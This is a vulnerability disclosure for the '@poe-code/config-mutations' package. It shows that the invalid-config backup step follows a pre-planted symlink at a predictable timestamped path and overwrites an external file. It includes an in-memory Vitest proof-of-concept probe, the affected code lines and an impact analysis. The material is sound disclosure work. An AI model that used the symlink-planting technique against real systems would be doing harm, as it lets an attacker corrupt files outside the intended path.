# Config Mutations invalid backup symlink overwrites external file

## Summary

The public `@poe-code/config-mutations` invalid-document recovery flow creates backups at a predictable timestamped filename and writes to it without rejecting symbolic links. A pre-existing symlink at the computed `.invalid-<timestamp>` backup pathname redirects malformed configuration contents into an external file during a normal `configMutation.merge()` operation.

## Reproduction

From the repository root, create and run this disposable in-memory Vitest probe:

```sh
cat > packages/config-mutations/src/__probe__.test.ts <<'EOF'
import { vol, fs as memoryFs } from "memfs";
import { afterEach, describe, expect, it, vi } from "vitest";
import { configMutation, runMutations } from "./index.js";
import type { FileSystem } from "./types.js";

describe("invalid config backup symlink destination", () => {
  afterEach(() => {
    vi.useRealTimers();
    vol.reset();
  });

  it("overwrites an external file through a pre-existing invalid-backup symlink", async () => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date("2026-05-26T12:34:56.789Z"));
    const targetPath = "/home/test/.config.json";
    const backupPath = "/home/test/.config.json.invalid-2026-05-26T12-34-56-789Z.json";
    const outsidePath = "/outside/controlled.json";
    vol.fromJSON({
      [targetPath]: "{ broken",
      [outsidePath]: "external-original"
    }, "/");
    vol.symlinkSync(outsidePath, backupPath);
    const fs = memoryFs.promises as unknown as FileSystem;

    await runMutations(
      [configMutation.merge({ target: "~/.config.json", value: { safe: true }, format: "json" })],
      { fs, homeDir: "/home/test" }
    );

    const outside = vol.readFileSync(outsidePath, "utf8") as string;
    const target = vol.readFileSync(targetPath, "utf8") as string;
    console.log(JSON.stringify({ outside, target }));
    expect(outside).toBe("{ broken");
    expect(target).toContain('"safe": true');
  });
});
EOF
npm exec -- vitest run packages/config-mutations/src/__probe__.test.ts --reporter verbose
rm packages/config-mutations/src/__probe__.test.ts
```

The probe passes and prints:

```text
{"outside":"{ broken","target":"{\n  \"safe\": true\n}\n"}
```

## Observed Behavior

`configMutation.merge()` reads malformed JSON from `~/.config.json`, successfully writes a repaired live configuration document, and also overwrites the external file targeted by the planted backup symlink with the original malformed contents. The caller receives a successful mutation result and no indication that a path outside the intended configuration file was modified.

`createInvalidDocumentBackupPath()` derives the backup filename only from the target path and current timestamp at `packages/config-mutations/src/execution/apply-mutation.ts:35` through `packages/config-mutations/src/execution/apply-mutation.ts:37`. When parsing fails, `applyConfigMerge()` invokes `backupInvalidDocument()` at `packages/config-mutations/src/execution/apply-mutation.ts:415` through `packages/config-mutations/src/execution/apply-mutation.ts:424`; that helper calls `fs.writeFile()` directly on the predictable backup path at `packages/config-mutations/src/execution/apply-mutation.ts:40` through `packages/config-mutations/src/execution/apply-mutation.ts:47`, following the existing symbolic link.

## Expected Behavior

Invalid-document recovery should preserve the malformed source only in a newly created regular backup file beneath the intended configuration directory. A pre-existing symlink at the prospective backup pathname should cause recovery to fail safely without modifying the symlink target.

## Impact

A local attacker, crafted workspace, or compromised home-directory state can redirect malformed configuration recovery writes into an arbitrary writable external file with the process's privileges. Running an otherwise routine configuration merge can therefore corrupt unrelated data while reporting normal successful recovery of the live config.
